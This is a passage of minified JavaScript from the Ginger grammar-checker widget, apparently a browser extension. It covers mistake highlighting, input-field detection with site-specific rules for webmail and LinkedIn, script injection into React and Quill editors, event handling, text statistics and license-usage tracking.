                }
            }
            return false;
        };
        var r = function(e) {
            b = e;
        };
        var n = null;
        var i = function(e) {
            if (b) {
                o(e);
                return;
            }
            if (n) {
                clearTimeout(n);
                n = setTimeout(function() {
                    o(e);
                }, 20);
            } else {
                o(e);
                n = setTimeout(function() {});
            }
        };
        var o = function(e) {
            if (!b && h !== document.activeElement) return;
            if (!m.isEnabled() || !gingerModule.get("widget").isEnabled()) return;
            x();
            S();
            if (!y) return;
            var t = gingerModule.get("widget.utils").cloneRepresentation(e);
            if (h.innerHTML == "") {
                $gingerWidgetJquery(h).html($gingerWidgetJquery(h).text());
            }
            var r = T(t);
            var n = false;
            var i = h.querySelectorAll(w);
            for (var o = 0; o < i.length; o++) {
                var a = i[o];
                var g = a.id.replace("gwmw-", "");
                if (!a.id || r.indexOf(g) === -1) {
                    if (!n) {
                        n = true;
                        C();
                    }
                    W(a);
                }
            }
            for (var s = 0; s < t.length; s++) {
                var c = t[s];
                if (c.correction && c.correction.Corrections.length) {
                    for (var l = 0; l < c.correction.Corrections.length; l++) {
                        var u = c.correction.Corrections[l];
                        var d = u && u.ignored;
                        var f = h.querySelector("#gwmw-" + u.id);
                        var p = J(h, e, c, u);
                        if (!f && !d && !p) {
                            if (!n) {
                                n = true;
                                C();
                            }
                            var v = $(h, c, u);
                            if (v) {
                                v.className = "ginger-module-highlighter-mistake-anim ginger-module-highlighter-mistake-type-" + u.Type;
                                v.id = "gwmw-" + u.id;
                                v.addEventListener("animationend", function(t) {
                                    return function(e) {
                                        $gingerWidgetJquery(t).removeClass("ginger-module-highlighter-mistake-anim");
                                    };
                                }(v), {
                                    once: true
                                }, true);
                            } else {
                                if (window.Sentry) {
                                    Sentry.setContext("extra", {
                                        innerHTML: h.innerHTML,
                                        sentence: c,
                                        correction: u
                                    });
                                    Sentry.captureMessage("Couldn't wrap mistakeNode #1 (handled .className bug)");
                                }
                            }
                        } else if (p) {} else if (u.ignored) {
                            if (!n) {
                                n = true;
                                C();
                            }
                            W(f);
                        } else if (c.activeSentence && !k(u, c)) {
                            if (!n) {
                                n = true;
                                C();
                            }
                            W(f);
                            var v = $(h, c, u);
                            if (v) {
                                v.className = "ginger-module-highlighter-mistake-type-" + u.Type;
                                v.id = "gwmw-" + u.id;
                            } else {
                                if (window.Sentry) {
                                    Sentry.setContext("extra", {
                                        innerHTML: h.innerHTML,
                                        sentence: c,
                                        correction: u
                                    });
                                    Sentry.captureMessage("Couldn't wrap mistakeNode #2 (handled .className bug)");
                                }
                            }
                        }
                    }
                }
            }
            h.normalize();
            if (n) M();
            setTimeout(q, 150);
        };
        var a = function() {
            return $gingerWidgetJquery(h).find(w);
        };
        var s = function(e) {
            if (!e) {
                c();
            }
            y = e;
        };
        var c = function() {
            a().each(function(e, t, e) {
                W(t);
            });
        };
        var T = function(e) {
            var t = [];
            for (var r = 0; r < e.length; r++) {
                if (e[r].correction && e[r].correction.Corrections && e[r].correction.Corrections.length) {
                    for (var n = 0; n < e[r].correction.Corrections.length; n++) {
                        t.push(e[r].correction.Corrections[n].id);
                    }
                }
            }
            return t.sort();
        };
        var l = function(e) {
            m = e;
            h = m.element;
        };
        return {
            refresh: i,
            init: l,
            setVisibility: s,
            getMistakeElements: a,
            destroy: c,
            unit: {
                createMistakeTag: $,
                removeMistakeTag: W,
                saveSelection: C,
                restoreSelection: M,
                wrapSelection: g,
                isThereBlockElemDifference: e,
                setAntiCollision: r
            }
        };
    }, [ "widget.utils", "widget.selectionManager" ]);
})();

(function() {
    var e = gingerModule.load("widget.injector.draft", function() {
        var e = function() {
            var i = {};
            var a = function(e) {
                for (var t in e) {
                    if (t.indexOf("__reactInternalInstance") === 0 || t.indexOf("__reactProps")) {
                        return e[t].memoizedProps || e[t]._currentElement.props;
                    }
                }
                return null;
            };
            var g = function(e) {
                e.defaultPrevented = false;
                e.target = document.activeElement;
                e.preventDefault = function() {};
                return e;
            };
            document.addEventListener("gingerModule-hasReactProp", function(e) {
                var t = e.detail;
                var r = !!a(t.element);
                t.cb(r);
            });
            document.addEventListener("gingerModule-eventEmitter-react-fire", function(e) {
                var t = a(document.activeElement);
                if (e.detail.event) {
                    var r = e.detail.event;
                    var n = e.detail.params ? g(e.detail.params) : {};
                    if (t && r && t[r]) {
                        t[r](n);
                    }
                } else if (e.detail.prop) {
                    if (t) {
                        t[e.detail.prop] = e.detail.value;
                    }
                }
            });
            document.addEventListener("gingerModule-eventEmitter-onpaste", function(e) {
                var t = a(document.activeElement);
                var r = g({
                    clipboardData: {
                        getData: function() {
                            return e.detail || "";
                        },
                        items: [ "text/plain" ]
                    }
                });
                if (t && t.onPaste) {
                    t.onPaste(r);
                } else if (t && t.onChange) {
                    var n = document.activeElement;
                    var i = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                    i.call(n, e.detail);
                    var o = new Event("input", {
                        bubbles: true
                    });
                    n.dispatchEvent(o);
                }
            });
            document.addEventListener("gingerModule-eventEmitter-onkeydown", function(e) {
                var t = a(document.activeElement);
                var r = g(e.detail);
                if (t) {
                    t.onKeyDown(r);
                }
            });
            var e = function(e, t) {
                if (!i[e]) return;
                for (var r = 0; r < i[e].length; r++) {
                    var n = i[e][r];
                    n(new CustomEvent(e), t);
                }
            };
            var o = document.addEventListener.bind(document);
            document.addEventListener = function(e, t, r) {
                var n = i[e] || [];
                n.push(t);
                i[e] = n;
                o(e, t, r);
            };
        };
        return e;
    });
})();

(function() {
    var e = gingerModule.load("widget.injector", function() {
        var t = function(e, t, r) {
            if (!r) r = [];
            var n = e.createElement("script");
            var i = t.toString();
            n.innerHTML = "(function(){(" + i + ")(" + r.join(",") + ") })()";
            e.documentElement.appendChild(n);
        };
        var r = {};
        var e = function(e) {
            if (!r[e]) {
                r[e] = true;
                if (document.body) {
                    t(document, gingerModule.get(e), []);
                }
            }
        };
        return {
            injectOnce: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.injector.quill", function() {
        var e = function() {
            var g = function(e, t, r, n) {
                if (!r) r = 0;
                if (!n) n = [];
                if (r > 5) return null;
                for (var i in e) {
                    if (i === "CSSStyleSheet") break;
                    if (i === t) {
                        return e[i];
                    }
                    if (typeof e[i] === "object") {
                        var o = n.slice(0);
                        o.push(i);
                        var a = g(e[i], t, r + 1, o);
                        if (a) {
                            return a;
                        }
                    }
                }
                return null;
            };
            var n = function(t) {
                function r(e, t) {
                    if (typeof t !== "function" && t !== null) {
                        throw new TypeError("Super expression must either be null or a function, not " + typeof t);
                    }
                    e.prototype = Object.create(t && t.prototype, {
                        constructor: {
                            value: e,
                            enumerable: false,
                            writable: true,
                            configurable: true
                        }
                    });
                    if (t) Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t;
                }
                function n(e, t) {
                    if (!e) {
                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    }
                    return t && (typeof t === "object" || typeof t === "function") ? t : e;
                }
                var i = function() {
                    r(e, t.imports["blots/inline"]);
                    function e() {
                        return n(this, (e.__proto__ || Object.getPrototypeOf(e)).apply(this, arguments));
                    }
                    return e;
                }();
                i.tagName = "GWMW";
                i.blotName = "ginger-inline";
                i.formats = function(e) {
                    return e.id;
                };
                t.register("formats/ginger-inline", i);
                var e = function() {
                    r(e, t.imports["blots/inline"]);
                    function e() {
                        return n(this, (i.__proto__ || Object.getPrototypeOf(e)).apply(this, arguments));
                    }
                    return e;
                }();
                e.tagName = "GWCPHB";
                e.blotName = "ginger-inline-ph";
                t.register("formats/ginger-inline-ph", e);
            };
            var i = false;
            var o = function() {
                if (i) return;
                try {
                    var e = g(window.Aura, "ComponentService.indexComponent");
                    var t = g(e, "lightning/quillLib");
                    var r = g(t, "Quill");
                    n(r);
                    i = true;
                    window.removeEventListener("click", o);
                } catch (e) {
                    console.error("ginger injection failed", e);
                }
            };
            window.addEventListener("click", o);
            o();
        };
        return e;
    });
})();

(function() {
    var e = gingerModule.load("widget.inputFinder", function() {
        var i = {
            selector: "textarea, *[contenteditable]"
        };
        var r = $gingerWidgetJquery({});
        var n = [];
        var t = 5e3;
        var o = null;
        var a = function(e) {
            $field = $gingerWidgetJquery(e);
            var t = {};
            t.id = gingerModule.get("widget.utils").generateUID();
            $field.data("gingerWidgetFieldId", t.id);
            $field.gingerWidgetFieldId = t.id;
            n.push(e);
            r.trigger("new", $field.get(0));
        };
        var g = function(e) {
            var t = $gingerWidgetJquery(e);
            var r = location.hostname;
            if (self != top && /localhost/.test(r) && window.parent.location) r = window.parent.location.hostname;
            if (window.location.hostname === "www.linkedin.com") {
                if (t.attr("id") === "jobs-description") {
                    return true;
                } else if (t.hasClass("mentions-texteditor__contenteditable")) {
                    return true;
                } else if (/rich-text-editor/.test(t.parent().attr("id"))) {
                    return true;
                }
            }
            if (window.location.hostname === "mail.google.com") {
                t[0].setAttribute("data-ginger-wrap", "gmail");
                return true;
            }
            if (/outlook.live.com|outlook.office365.com|outlook.office.com/.test(r)) {
                return true;
            }
            if (/1und1.de|gmx.net|gmx.com|web.de/.test(r)) {
                return true;
            }
            if (window.location.hostname === "localhost") {
                if (t.attr("id") === "unittest-input-field-that-matches-override-criteria") {
                    return true;
                }
            }
            if (t.is(".cke_editable")) {
                return true;
            }
            return false;
        };
        var s = function(r) {
            if (i.selector === null) return;
            if (gingerModule.get("widget").isEnabled()) {
                var n = $gingerWidgetJquery(document.activeElement);
                var e = gingerModule.get("widget.siteSettings").get(window.location.href, document.activeElement);
                var t = n && (n.attr("contenteditable") === "" || n.attr("contenteditable") === true || n.attr("contenteditable") == "true");
                if (n && !n.data("gingerWidgetFieldId") && n.attr("disableGinger") !== "true" && n.attr("data-ginger") !== "false" && (n.is(i.selector) || t) && !e.disabled) {
                    if (n.attr("spellcheck") !== "false" || g(document.activeElement)) {
                        gingerModule.get("widget.preFlightProbe").run(document.activeElement).then(function e() {
                            a(n);
                            if (r) r();
                        }, function e(t) {
                            a(n);
                            if (r) r();
                        });
                    }
                }
            } else {
                console.log("widget is disabled");
            }
        };
        var c = false;
        var e = function(e) {
            if (c) return;
            i = gingerModule.get("widget.utils").merge(i, e);
            s();
            o = setInterval(s, t);
            document.addEventListener("click", function() {
                setTimeout(s, 400);
            });
            c = true;
        };
        var l = function(e) {
            a(e);
            return e;
        };
        return {
            listen: r,
            refresh: s,
            feed: l,
            init: e
        };
    }, [ "widget.utils", "widget.siteSettings" ]);
})();

(function() {
    var e = gingerModule.load("widget.inputHandler", function() {
        var p;
        var v = [];
        var a = null;
        var t = null;
        var r = null;
        var n = 1500;
        var e = null;
        var o = 50;
        var i = null;
        var g = true;
        var s = false;
        var c = {};
        var l = null;
        var m = [];
        var u = {};
        var d = function() {
            var e = gingerModule.get("widget.utils").isRichTextElement(p.element);
            var t = e ? p.element.innerHTML : p.element.value;
            if (u.raw && u.raw === t) {
                return u.value;
            }
            u.raw = t;
            u.value = gingerModule.get("widget.contentManager").getVal(p.element);
            return u.value;
        };
        var f = function() {
            var e = gingerModule.get("widget.utils").isRichTextElement(p.element);
            if (e) {
                if ($gingerWidgetJquery(p.element).text() === $gingerWidgetJquery(p.element).attr("data-placeholder-default")) {
                    return "";
                } else {
                    return $gingerWidgetJquery(p.element).html().replace(/<[\/]?gwmw[^>]*>/gi, "");
                }
            } else {
                return $gingerWidgetJquery(p.element).val();
            }
        };
        var h = function(e, t, r, n) {
            gingerModule.get("widget.contentManager").setVal(p.element, e, t, r, n).then(function() {
                j();
                D(true);
            });
        };
        var w = function(e) {
            var t = y(e);
            return t !== null ? v[t] : null;
        };
        var y = function(e) {
            for (var t = 0; t < v.length; t++) {
                if (v[t].id === e) {
                    return t;
                }
            }
            return null;
        };
        var b = function(e) {
            for (var t = 0; t < v.length; t++) {
                if (v[t].correction && v[t].correction.Corrections) {
                    for (var r = 0; r < v[t].correction.Corrections.length; r++) {
                        var n = v[t].correction.Corrections[r];
                        if (n.id === e) {
                            return v[t];
                        }
                    }
                }
            }
            return null;
        };
        var x = function(e) {
            for (var t = 0; t < v.length; t++) {
                if (v[t].correction && v[t].correction.Corrections) {
                    for (var r = 0; r < v[t].correction.Corrections.length; r++) {
                        var n = v[t].correction.Corrections[r];
                        if (n.id === e) {
                            return n;
                        }
                    }
                }
            }
            return null;
        };
        var $ = function(e) {
            return e.replace("gwmw-", "");
        };
        var C = function(e, t, r, n) {
            return gingerModule.get("widget.contentManager").setVal(p.element, e, t, r);
        };
        var M = function(e) {
            var t = b(e);
            var r = 0;
            for (var n = 0; n < t.correction.Corrections.length; n++) {
                if (t.correction.Corrections[n].id === e) {
                    t.correction.Corrections.splice(n, 1);
                    n--;
                }
            }
            return t;
        };
        var W = function(e) {
            var t = v;
            var r = $gingerWidgetJquery.Deferred();
            var n = b(e);
            var i = x(e);
            var o = n.startsAt;
            var a = I(n, i.From, i.To + 1);
            var g = a.length - (i.To + 1 - i.From);
            M(i.id);
            C(a, o + i.From, o + i.To + 1).then(function() {
                j();
                r.resolve();
            });
            return r.promise();
        };
        var S = function(e, t) {
            try {
                m.push({
                    result: e,
                    bubbleResultData: t,
                    representation: v
                });
                var r, n;
                if (e === "ignoreAll") {
                    n = w(t.sentenceId);
                    r = x(t.correctionId);
                    var i = n.correction.Corrections.length;
                    var o = [];
                    for (var a = 0; a < n.correction.Corrections.length; a++) {
                        var g = n.correction.Corrections[a];
                        if (g.From >= r.UXFrgFrom && g.To <= r.UXFrgTo) {
                            o.push(g);
                        }
                    }
                    for (var a = 0; a < o.length; a++) {
                        gingerModule.get("widget.correctionService").ignoreMistake(o[a], n, function() {});
                    }
                    D(true);
                } else if (e === "approve") {
                    W(t.correctionId).then(function() {
                        p.stats.update(v);
                    });
                    gingerModule.get("widget.licenseLimits").approvalsUsed(1);
                } else if (e === "ignore") {
                    n = b(t.correctionId);
                    r = x(t.correctionId);
                    M(t.correctionId);
                    gingerModule.get("widget.correctionService").ignoreMistake(r, n);
                    D(true);
                } else if (e === "addToDictionary") {
                    n = b(t.correctionId);
                    r = x(t.correctionId);
                    var s = n.text.substring(r.From, r.To + 1);
                    gingerModule.get("widget.api").addToDictionary(s, function(e) {});
                    gingerModule.get("widget.cache").remove("api.sentence", n.text.trim());
                    for (var a = 0; a < v.length; a++) {
                        if (v[a].correction && v[a].correction.Corrections) {
                            for (var c = 0; c < v[a].correction.Corrections.length; c++) {
                                var l = v[a].text.substring(v[a].correction.Corrections[c].From, v[a].correction.Corrections[c].To + 1);
                                if (l === s) {
                                    M(v[a].correction.Corrections[c].id);
                                }
                            }
                        }
                    }
                    D(true);
                } else if (e === "approveAll") {
                    n = w(t.sentenceId);
                    r = x(t.correctionId);
                    var u = I(n, r.UXFrgFrom, r.UXFrgTo + 1);
                    var d = 0;
                    for (var a = 0; a < n.correction.Corrections.length; a++) {
                        if (n.correction.Corrections[a].From >= r.UXFrgFrom && n.correction.Corrections[a].To <= r.UXFrgTo) {
                            d++;
                            n.correction.Corrections.splice(a, 1);
                            a--;
                        }
                    }
                    var f = {
                        From: r.UXFrgFrom,
                        To: r.UXFrgTo,
                        UXFrgFrom: r.UXFrgFrom,
                        UXFrgTo: r.UXFrgTo,
                        Suggestions: [ {
                            Text: u
                        } ],
                        id: gingerModule.get("widget.utils").generateUID()
                    };
                    n.correction.Corrections.push(f);
                    W(f.id).then(function() {});
                    gingerModule.get("widget.licenseLimits").approvalsUsed(d);
                }
            } catch (e) {
                if (window.Sentry) {
                    Sentry.captureException(e);
                } else {
                    if (console && console.error) console.error(e);
                    throw new Error(e);
                }
            }
        };
        var q = null;
        var k = function(e) {
            if (q) {
                if (gingerModule.get("widget.utils").isMouseEventOverElement(e, q)) {
                    return q;
                }
            }
            var t = p.highlighter.getMistakeElements();
            var r = null;
            for (var n = 0; n < t.length && r === null; n++) {
                if (gingerModule.get("widget.utils").isMouseEventOverElement(e, t[n])) {
                    r = t[n];
                    return r;
                }
            }
            return null;
        };
        var J = function(i) {
            if (e) e = clearTimeout(e);
            e = setTimeout(function() {
                var e = k(i);
                if (e) {
                    var t;
                    q = e;
                    if ($gingerWidgetJquery(e).attr("id")) {
                        t = $($gingerWidgetJquery(e).attr("id"));
                    } else {
                        t = $gingerWidgetJquery(e).data("cid");
                    }
                    var r = x(t);
                    if (!r) return;
                    var n = b(r.id);
                    if (n.correction.checkType === "shallow") {
                        D(true, function() {
                            J(i);
                        });
                    } else {
                        gingerModule.get("widget.correctionBubble").show(r, n, S);
                    }
                } else {
                    if (q) {
                        gingerModule.get("widget.correctionBubble").gracefulHide();
                    }
                    q = null;
                }
            }, o);
        };
        var T = function() {
            $gingerWidgetJquery(p.element).on("mousemove", J);
        };
        var E = function() {
            $gingerWidgetJquery(p.element).off("mousemove", J);
        };
        var L = function(e) {
            t = e;
            if (e) {
                T();
            } else {
                E();
            }
        };
        var A = function() {
            if (r !== null) {
                r = clearTimeout(r);
            }
        };
        var F = function(e) {
            A();
            r = setTimeout(function() {
                D(true);
            }, e || n);
        };
        var I = function(e, t, r) {
            var n = e.text;
            var i = 0;
            for (var o = 0; o < e.correction.Corrections.length; o++) {
                if (e.correction.Corrections[o].From >= t && e.correction.Corrections[o].To <= r - 1) {
                    var a = e.correction.Corrections[o].From;
                    var g = e.correction.Corrections[o].To + 1;
                    var s = e.correction.Corrections[o].Suggestions.length ? e.correction.Corrections[o].Suggestions[0].Text : e.text.substring(a, g);
                    n = n.substring(0, a + i) + s + n.substring(g + i);
                    i += s.length - (g - a);
                }
            }
            return n.substring(t, r + i);
        };
        var O = {};
        var R = function(e, t) {
            if (!O[e]) {
                O[e] = [];
            }
            var r = O[e];
            r.push(t);
            p.events.listen.on(e, t);
        };
        var N = function(e) {
            if (!O[e]) return;
            for (var t = 0; t < O[e].length; t++) {
                p.events.listen.off(e, O[e][t]);
            }
        };
        var B = function() {
            gingerModule.get("widget.correctionBubble").hide();
            $gingerWidgetJquery(p.element).attr("spellcheck", "true");
            $gingerWidgetJquery(p.element).data("gingerWidgetFieldId", null);
            p.highlighter.destroy();
            L(false);
            for (var e in O) {
                N(e);
            }
        };
        var P = function() {
            R("focus", function() {
                F();
            });
            R("blur", function() {
                setTimeout(function() {
                    gingerModule.get("widget.correctionBubble").hide();
                }, 1e3);
            });
            R("delete", function() {
                l = "delete";
                setTimeout(function() {
                    p.events.listen.trigger("inputchange");
                }, 50);
            });
            R("mouseover", function() {
                L(true);
            });
            R("mouseout", function() {
                L(false);
            });
            R("paste", function() {
                setTimeout(function() {
                    j();
                    D(true);
                }, 50);
            });
            R("inputchange", function(e) {
                j();
                var t = gingerModule.get("widget.utils").isRichTextElement(p.element);
                var r = t ? $gingerWidgetJquery(p.element).text() : $gingerWidgetJquery(p.element).val();
                if (/^\s*$/.test(r)) {
                    v = [];
                    p.stats.update([]);
                    p.highlighter.refresh([]);
                    if (s) K(false);
                } else {
                    if (l == "sentence.end") {
                        D(true);
                    } else if (l == "word.end") {
                        D();
                        F();
                    } else if (l == "delete") {
                        p.highlighter.refresh(v);
                        p.stats.update(v);
                        F();
                    } else {
                        setTimeout(function() {
                            p.highlighter.refresh(v);
                            p.stats.update(v);
                            F();
                        }, 10);
                    }
                }
                l = null;
                p.stats.update(v);
            });
            R("sentence.end", function() {
                l = "sentence.end";
            });
            R("click", function() {
                if (window.location.hostname === "mail.google.com") {
                    Z();
                }
                l = "sentence.end";
                setTimeout(function() {
                    p.events.listen.trigger("inputchange");
                }, 50);
            });
            R("enter", function() {
                l = "sentence.end";
                setTimeout(function() {
                    p.events.listen.trigger("inputchange");
                }, 50);
            });
            R("word.end", function() {
                l = "word.end";
            });
            R("visibility.change", function(e, t) {
                if (g) {
                    p.highlighter.setVisibility(t);
                }
            });
        };
        var j = function() {
            var e = gingerModule.get("widget.phraseService").getRepresentation(p.element);
            var t = gingerModule.get("widget.utils").cloneRepresentation(v);
            var r = gingerModule.get("widget.correctionService").mergeCorrections(e, t);
            v = r;
            p.highlighter.refresh(v);
            p.stats.update(v);
            return v;
        };
        var D = function(e, n) {
            if (!g) {
                return n && n([]);
            }
            if (!v.length) {
                p.highlighter.refresh(v);
                p.stats.update(v);
                if (n) n([]);
                return;
            }
            A();
            if (e) {
                for (var t = 0; t < v.length; t++) {
                    v[t].activeSentence = null;
                }
            }
            var r = gingerModule.get("widget.utils").cloneRepresentation(v);
            var i = new Date().getTime();
            a = i;
            var o = null;
            gingerModule.get("widget.correctionService").correct(r, function e(t) {
                if (a !== i) {
                    return;
                }
                v = t;
                if (!o) {
                    j();
                } else {
                    o = clearTimeout(o);
                }
                o = setTimeout(function() {
                    o = clearTimeout(o);
                    j();
                }, 10);
            }, function e() {
                if (a !== i) {
                    return;
                }
                c = {};
                for (var t = 0; t < v.length; t++) {
                    var r = v[t];
                    if (r.correction && r.correction.Sentences && r.correction.Sentences.length && !r.correction.Sentences[0].IsEnglish && r.words.length >= 8) {
                        K(true);
                    } else if (!X() && r.correction && r.correction.Corrections && r.correction.Corrections.length && r.words.length >= 8) {
                        gingerModule.get("widget.api").detectLang(r.text, function(e) {
                            if (e && e.d !== "en") K(true);
                        });
                    }
                }
                gingerModule.get("widget.correctionBubble").hide();
                if (n) n(v);
            });
        };
        var U = function() {
            p.element.focus();
        };
        var _ = function() {
            h("");
            v = [];
            p.stats.update([]);
            p.highlighter.refresh([]);
        };
        var G = function() {
            if (!g) return;
            g = false;
            gingerModule.get("widget.correctionBubble").hide();
            $gingerWidgetJquery(p.element).attr("spellcheck", "true");
            p.highlighter.setVisibility(false);
            p.events.listen.trigger("enable.change", {
                enabled: false
            });
            p.events.listen.trigger("disabled");
        };
        var H = function() {
            if (g) return;
            g = true;
            $gingerWidgetJquery(p.element).attr("spellcheck", "false");
            p.highlighter.setVisibility(true);
            p.events.listen.trigger("enable.change", {
                enabled: true
            });
            p.events.listen.trigger("enabled");
            D(true);
        };
        var V = false;
        var K = function(e, t) {
            if (t) V = true;
            if (s === e) return;
            if (V && !t) return;
            s = e;
            if (e && g) {
                G();
            } else if (!g) {
                H();
            }
            p.events.listen.trigger("markedForeign.change", e);
        };
        var z = function() {
            return s;
        };
        var X = function() {
            return V;
        };
        var Z = function() {
            var e = document.querySelectorAll("[data-overlay-action=spellreplace]");
            e = Array.from(e);
            if (e && Array.isArray(e) && e.length > 0) {
                e.forEach(function(e) {
                    var t = e.closest(".pl");
                    if (t) {
                        t.remove();
                    }
                });
            }
        };
        var Q = function(e) {
            if (!e) return;
            e.setAttribute("spellcheck", "false");
            try {
                p = {
                    element: $gingerWidgetJquery(e).get(0),
                    id: $gingerWidgetJquery(e).data("gingerWidgetFieldId"),
                    events: null,
                    highlighter: null,
                    rewriter: null,
                    stats: null,
                    empty: _,
                    focus: U,
                    setVal: h,
                    getVal: d,
                    enable: H,
                    disable: G,
                    getFormattedVal: f,
                    markForeign: K,
                    getIsForeign: z,
                    setRepresentation: function(e) {
                        v = e;
                    },
                    getRepresentation: function() {
                        return v;
                    },
                    isEnabled: function() {
                        return g;
                    },
                    destroy: B,
                    unit: {
                        replaceInTextarea: C,
                        recheck: D,
                        updateRepresentation: j,
                        handleCorrectionBubbleResult: S,
                        flush: _
                    }
                };
                p.settings = gingerModule.get("widget.siteSettings").get(window.location.href, e);
                if (!p.settings) return;
                p.highlighter = new gingerModule.get(p.settings.highlighter, true)();
                p.stats = new gingerModule.get("widget.inputHandler.stats", true)();
                p.events = new gingerModule.get("widget.inputHandler.events", true)();
                p.events.init(p);
                p.highlighter.init(p);
                p.stats.init(e);
                gingerModule.get("widget.config").listen.on("change/dialect", function(e, t) {
                    gingerModule.get("widget.cache").flush();
                    v = [];
                    j();
                    D(true);
                });
                if (p.settings.injection) {
                    gingerModule.get("widget.injector").injectOnce(p.settings.injection);
                }
                gingerModule.get("widget.onlinestatus").listen.on("online", function() {
                    D(true);
                    console.log("widget is back online");
                });
                gingerModule.get("widget.onlinestatus").listen.on("offline", function() {
                    console.warn("Ginger Widget is offline");
                });
                P();
                v = gingerModule.get("widget.phraseService").getRepresentation(p.element);
                p.stats.update(v);
                if (v.length) {
                    D(true);
                }
            } catch (e) {
                console.error(e);
            }
            return p;
        };
        return {
            init: Q
        };
    }, [ "widget.utils", "widget.api", "widget.phraseService", "widget.correctionService", "widget.correctionBubble", "widget.inputHandler.events", "widget.inputHandler.stats", "widget.onlinestatus" ]);
})();

(function() {
    var e = gingerModule.load("widget.inputHandler.events", function() {
        var n = $gingerWidgetJquery({});
        var g;
        var s = function(e) {
            var t = String.fromCharCode(e);
            var r = "?!.";
            return e === 13 || r.indexOf(t) !== -1;
        };
        var i = function(e) {
            var t = String.fromCharCode(e);
            var r = /\s/;
            var n = t.match(r) !== null;
            var i = $gingerWidgetJquery(g);
            var o = gingerModule.get("widget.caret").get(i);
            var a = i.val().substr(o - 1, 1);
            return s(a.charCodeAt(0)) || a.match(r) ? false : n;
        };
        var o = {};
        var a = 800;
        var c = null;
        var l = function() {
            var e = a;
            if (c) c = clearTimeout(c);
            var t = gingerModule.get("widget.mutationDetectorService").getLayout(g);
            if (t.isVisible !== o.isVisible) {
                e = a;
                n.trigger("visibility.change", t.isVisible);
                if (t.isVisible) {
                    n.trigger("mutation", {
                        input: g
                    });
                }
            } else {
                var r = gingerModule.get("widget.mutationDetectorService").compareLayouts(t, o);
                if (r) {
                    n.trigger("mutation", {
                        input: g
                    });
                    e = 80;
                }
            }
            o = t;
            c = setTimeout(l, e);
        };
        var e = function(e) {
            g = e.element;
            var t = $gingerWidgetJquery(g);
            t.on("keypress", function(e) {
                if (s(e.which)) {
                    n.trigger("sentence.end", {
                        input: t
                    });
                } else if (i(e.which)) {
                    n.trigger("word.end", {
                        input: t
                    });
                }
            });
            t.bind("paste", function() {
                n.trigger("paste", {
                    input: t
                });
            });
            t.on("keyup", function(e) {
                if (e.which === 13) {
                    n.trigger("enter", {
                        input: t
                    });
                }
            });
            t.on("keydown", function(e) {
                if ([ 8, 46 ].indexOf(e.which) !== -1) {
                    n.trigger("delete", {
                        input: t
                    });
                } else if ([ 37, 38, 39, 40 ].indexOf(e.which) !== -1) {
                    n.trigger("inputchange", {
                        input: t
                    });
                } else if (e.which === 89 && e.ctrlKey) {
                    n.trigger("paste");
                } else if (e.which === 90 && e.ctrlKey) {
                    n.trigger("paste");
                }
            });
            t.focus(function() {
                n.trigger("focus", {
                    input: t
                });
            });
            t.blur(function() {
                n.trigger("blur", {
                    input: t
                });
            });
            t.scroll(function() {
                n.trigger("scroll", {
                    input: t
                });
            });
            t.mouseover(function() {
                n.trigger("mouseover", {
                    input: t
                });
            });
            t.mouseout(function() {
                n.trigger("mouseout", {
                    input: t
                });
            });
            t.keydown(function() {
                n.trigger("keydown", {
                    input: t
                });
            });
            l();
            var r = gingerModule.get("widget.utils").isRichTextElement(g);
            document.addEventListener("click", function() {
                mutationIntervals = [ 0, 50, 100, 200, 500 ];
                mutationIntervals.forEach(function(e) {
                    setTimeout(l, mutationIntervals);
                });
                n.trigger("click");
            });
            g.addEventListener("input", function() {
                n.trigger("inputchange", {
                    input: g
                });
            });
            t.on("paste", function(e) {
                if (e.which === 8 || e.which === 46) {
                    return true;
                }
                n.trigger("paste");
            });
        };
        return {
            listen: n,
            checkMutation: l,
            init: e
        };
    }, [ "widget.utils", "widget.caret", "widget.mutationDetectorService" ]);
})();

(function() {
    var e = gingerModule.load("widget.inputHandler.stats", function() {
        var r = $gingerWidgetJquery({});
        var o;
        var e = Math.random();
        var n;
        var i = function(e) {
            var t = {
                grammar: 0,
                spelling: 0
            };
            if (e && e.length) {
                for (var r = 0; r < e.length; r++) {
                    if (e[r].correction) {
                        for (var n = 0; n < e[r].correction.Corrections.length; n++) {
                            var i = e[r].correction.Corrections[n];
                            if (!i.ignored) {
                                if (i.Type === 3 || i.Type === 2) {
                                    t.grammar++;
                                } else {
                                    t.spelling++;
                                }
                            }
                        }
                    }
                }
            }
            return t;
        };
        var a = function(e) {
            var t = {
                words: 0,
                characters: 0,
                charactersWithSpace: 0,
                sentences: 0
            };
            var r = gingerModule.get("widget.contentManager").getVal(o);
            if (r && !r.match(/^\s+$/)) {
                var n = r.replace(/\d+/g, "").replace(/(^\s*|\s*$)/g, "").match(/([^\x00-\x7F]|\w)+/g);
                if (!n) n = [];
                if (n.length === 1 && n[0] == "") n = [];
                var i = r.replace(/\s+/g, "");
                t.words = n.length;
                t.characters = i.length;
                t.charactersWithSpace = r.length;
            }
            if (e && e.length) {
                t.sentences = e.length;
                if (e[e.length - 1].text.match(/^\s*$/)) {
                    t.sentences--;
                }
            }
            return t;
        };
        var t = function(e) {
            if (!e) return;
            try {
                var t = {};
                t.mistakes = i(e);
                t.count = a(e);
                n = t;
                r.trigger("changed", n);
            } catch (e) {
                console.error(e);
            }
        };
        var g = function() {
            return n;
        };
        var s = function(e) {
            o = e;
            t();
        };
        return {
            listen: r,
            update: t,
            init: s,
            get: g
        };
    }, [ "widget.utils" ]);
})();

(function() {
    var e = gingerModule.load("widget.licenseLimits", function() {
        var i = null;
        var t = $gingerWidgetJquery({});
        var o = function(e) {
            var t = i;
            i = e;
            n(t);
            a(e);
        };
        var a = function(r, n) {
            var n = typeof n == "boolean" ? n : true;
            var i = 1e3 * 60 * 60;
            try {
                if (chrome && chrome.storage && chrome.storage.sync) {
                    chrome.storage.sync.get("approvalsUsed", function(e) {
                        var t = e.approvalsUsed;
                        if (!t) {
                            t = {
                                time: new Date().getTime() + i * 3,
                                value: r
                            };
                        } else {
                            t.value = r;
                            t.time = n ? new Date().getTime() + i * 3 : t.time;
                        }
                        chrome.storage.sync.set({
                            approvalsUsed: t
                        });
                    });
                }
            } catch (e) {
                console.error(e);
            }
        };
        var e = function() {
            return new Promise(function(r, e) {
                try {
                    if (chrome && chrome.storage && chrome.storage.sync) {
